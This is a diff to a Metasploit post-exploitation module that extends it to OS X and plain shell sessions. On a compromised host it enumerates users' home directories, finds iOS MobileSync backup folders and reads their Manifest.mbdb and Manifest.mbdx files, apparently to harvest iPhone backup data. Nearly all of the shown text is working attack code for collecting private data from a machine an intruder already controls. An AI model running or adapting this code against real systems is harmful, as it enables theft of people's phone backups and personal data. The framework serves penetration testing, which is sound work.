@@ -28,8 +28,8 @@ class Metasploit3 < Msf::Post
 					'bannedit' # Based on bannedit's pidgin_cred module structure
 				],
 			'Version'        => '$Revision$',
-			'Platform'       => ['windows'],
-			'SessionTypes'   => ['meterpreter' ]
+			'Platform'       => ['windows', 'osx'],
+			'SessionTypes'   => ['meterpreter', 'shell']
 		))
 		register_options(
 			[
@@ -88,31 +88,42 @@ class Metasploit3 < Msf::Post
 		end
 
 		if got_root?
-			userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
-			userdirs << "/root\n"
+			userdirs = []
+			session.shell_command("ls #{home}").gsub(/\s/, "\n").split("\n").each do |user_name|
+				userdirs << home + user_name
+			end
+			userdirs << "/root"
 		else
-			userdirs = session.shell_command("ls #{home}#{whoami}/Library/Application\\ Support/MobileSync/Backup/")
-			if userdirs =~ /No such file/i
-				return
+			userdirs = [ home + whoami ]
+		end
+
+		backup_paths = []
+		userdirs.each do |user_dir|
+			output = session.shell_command("ls #{user_dir}/Library/Application\\ Support/MobileSync/Backup/")
+			if output =~ /No such file/i
+				next
 			else
-				print_status("Found backup directory for: #{whoami}")
-				return ["#{home}#{whoami}/Library/Application\\ Support/MobileSync/Backup/"]
+				print_status("Found backup directory in: #{user_dir}")
+				backup_paths << "#{user_dir}/Library/Application\\ Support/MobileSync/Backup/"
 			end
 		end
 
-		paths = Array.new
-		userdirs.each_line do |dir|
-			dir.chomp!
-			next if dir == "." || dir == ".."
+		check_for_backups_unix(backup_paths)
+	end
 
-			dir = "#{home}#{dir}" if dir !~ /root/
-			print_status("Checking for backup directory in: #{dir}")
-
-			stat = session.shell_command("ls #{dir}/Library/Application\\ Support/MobileSync/Backup/")
-			next if stat =~ /No such file/i
-			paths << "#{dir}/Library/Application\\ Support/MobileSync/Backup/"
+	def check_for_backups_unix(backup_dirs)
+		dirs = []
+		backup_dirs.each do |backup_dir|
+			print_status("Checking for backups in #{backup_dir}")
+			session.shell_command("ls #{backup_dir}").each_line do |dir|
+				next if dir == "." || dir == ".."
+				if dir =~ /^[0-9a-f]{16}/i
+					print_status("Found #{backup_dir}\\#{dir}")
+					dirs << ::File.join(backup_dir.chomp, dir.chomp)
+				end
+			end
 		end
-		return paths
+		dirs
 	end
 
 	def enum_users_windows
@@ -168,6 +179,10 @@ class Metasploit3 < Msf::Post
 		print_status("Reading Manifest.mbdb from #{path}...")
 		if session.type == "shell"
 			mbdb_data = session.shell_command("cat #{path}/Manifest.mbdb")
+			if mbdb_data =~ /No such file/i
+				print_status("Manifest.mbdb not found in #{path}...")
+				return
+			end
 		else
 			mfd = session.fs.file.new("#{path}\\Manifest.mbdb", "rb")
 			until mfd.eof?
@@ -179,6 +194,10 @@ class Metasploit3 < Msf::Post
 		print_status("Reading Manifest.mbdx from #{path}...")
 		if session.type == "shell"
 			mbdx_data = session.shell_command("cat #{path}/Manifest.mbdx")
+			if mbdx_data =~ /No such file/i
+				print_status("Manifest.mbdx not found in #{path}...")
+				return
+			end
 		else
 			mfd = session.fs.file.new("#{path}\\Manifest.mbdx", "rb")
 			until mfd.eof?
